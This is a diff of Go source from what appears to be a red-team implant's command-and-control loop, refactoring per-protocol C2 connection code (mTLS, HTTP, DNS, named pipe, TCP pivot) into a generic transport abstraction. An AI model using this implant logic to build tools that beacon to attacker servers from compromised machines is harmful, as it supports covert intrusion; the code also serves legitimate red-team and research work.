@@ -121,94 +121,23 @@ func StartConnectionLoop() *Connection {
 	for connectionAttempts < maxErrors {
 
 		var connection *Connection
-		// var err error
+		var err error
 
 		uri := nextCCServer()
+
 		// {{if .Config.Debug}}
 		log.Printf("Next CC = %s", uri.String())
 		// {{end}}
 
-		switch uri.Scheme {
+		// For each new CC server, we instantiate a new transport and start it.
+		transport, _ := NewTransport(uri)
+		err = transport.Start()
+		if err == nil {
+			ServerComms = transport   // The first transport started is always tied to the Server.
+			connection = transport.C2 // The connection is never nil, for same reason.
+			Transports.Add(transport) // We add this transport to the Transports map
 
-		// *** MTLS ***
-		// {{if .Config.MTLSc2Enabled}}
-		case "mtls":
-			transport, err := newTransportMTLS(uri)
-			if err == nil {
-				ServerComms = transport
-				connection = transport.C2
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[mtls] Connection failed %s", err)
-			// {{end}}
-			// {{end}}  - MTLSc2Enabled
-
-		case "https":
-			fallthrough
-		case "http":
-			// *** HTTP ***
-			// {{if .Config.HTTPc2Enabled}}
-			connection, err = httpConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} - HTTPc2Enabled
-
-		case "dns":
-			// *** DNS ***
-			// {{if .Config.DNSc2Enabled}}
-			connection, err = dnsConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[dns] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} - DNSc2Enabled
-
-		case "namedpipe":
-			// *** Named Pipe ***
-			// {{if .Config.NamePipec2Enabled}}
-			connection, err = namedPipeConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} -NamePipec2Enabled
-
-		case "tcppivot":
-			// {{if .Config.TCPPivotc2Enabled}}
-			connection, err = tcpPivotConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[tcppivot] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} -TCPPivotc2Enabled
-
-		default:
-			// {{if .Config.Debug}}
-			log.Printf("Unknown c2 protocol %s", uri.Scheme)
-			// {{end}}
+			return connection
 		}
 
 		// {{if .Config.Debug}}
